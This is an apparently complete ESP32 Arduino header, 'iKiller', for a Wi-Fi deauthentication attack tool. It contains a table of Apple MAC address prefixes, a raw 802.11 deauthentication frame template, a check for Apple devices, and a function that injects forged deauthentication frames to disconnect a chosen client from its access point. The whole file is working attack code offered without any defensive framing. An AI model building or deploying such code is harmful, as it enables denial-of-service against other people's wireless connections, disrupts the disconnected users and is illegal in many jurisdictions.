#ifndef IKILLER_H
#define IKILLER_H

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

// Common Apple OUIs (First 3 bytes of MAC)
const uint8_t apple_ouis[][3] = {
  {0x00, 0x03, 0x93}, {0x00, 0x05, 0x02}, {0x00, 0x0A, 0x27}, {0x00, 0x0A, 0x95},
  {0x00, 0x10, 0xFA}, {0x00, 0x16, 0xCB}, {0x00, 0x17, 0xF2}, {0x00, 0x1E, 0xC2},
  {0x00, 0x23, 0x12}, {0x00, 0x25, 0x00}, {0x00, 0x26, 0x08}, {0x04, 0x0C, 0xCE},
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  {0xD8, 0x30, 0x62}, {0xF0, 0x18, 0x98}, {0xFC, 0xFC, 0x48}
};
const int apple_ouis_count = sizeof(apple_ouis) / 3;

// Deauth Packet Template
uint8_t ik_deauth_pkt[26] = {
  0xc0, 0x00,              // Frame Control (Type: Management, Subtype: Deauthentication)
  0x3a, 0x01,              // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (to be filled)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC - to be filled)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (to be filled)
  0x00, 0x00,              // Sequence Control
  0x01, 0x00               // Reason Code (1: Unspecified)
};

bool is_apple_device(const uint8_t* mac) {
  for (int i = 0; i < apple_ouis_count; i++) {
    if (mac[0] == apple_ouis[i][0] && mac[1] == apple_ouis[i][1] && mac[2] == apple_ouis[i][2]) {
      return true;
    }
  }
  return false;
}

void send_deauth(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Fill deauth packet
  memcpy(&ik_deauth_pkt[4], client_mac, 6);
  memcpy(&ik_deauth_pkt[10], ap_mac, 6);
  memcpy(&ik_deauth_pkt[16], ap_mac, 6);
  
  // Send 3 times for robustness
  for (int i = 0; i < 3; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, ik_deauth_pkt, sizeof(ik_deauth_pkt), false);
    delay(1);
  }
}

#endif
